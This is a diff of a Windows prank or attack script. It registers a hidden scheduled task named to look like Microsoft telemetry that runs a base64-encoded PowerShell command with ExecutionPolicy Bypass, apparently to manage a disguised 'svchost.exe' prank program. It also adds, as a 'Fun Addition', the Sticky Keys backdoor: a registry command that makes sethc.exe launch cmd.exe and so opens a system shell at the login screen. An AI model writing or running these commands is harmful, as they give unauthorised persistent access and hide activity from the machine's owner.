@@ -42,3 +42,5 @@ Unregister-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Micros
 Scheduled task that kills goose eveyr 30 mins so it doesn't run endlessly if not killed
 Register-ScheduledTask -TaskName "Microsoft Telemetry Cleanup" -TaskPath "\Microsoft\Windows\Application Experience\" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLlBhdGggLWxpa2UgJypcQmx1ZXRlZXRoXEdvb3NlVGVzdC1tYWluXHN2Y2hvc3QuZXhlJ30gfCBTdG9wLVByb2Nlc3MgLUZvcmNl')))`"") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Force
 
+Sticky Keys Registry Key (Fun Addition):
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
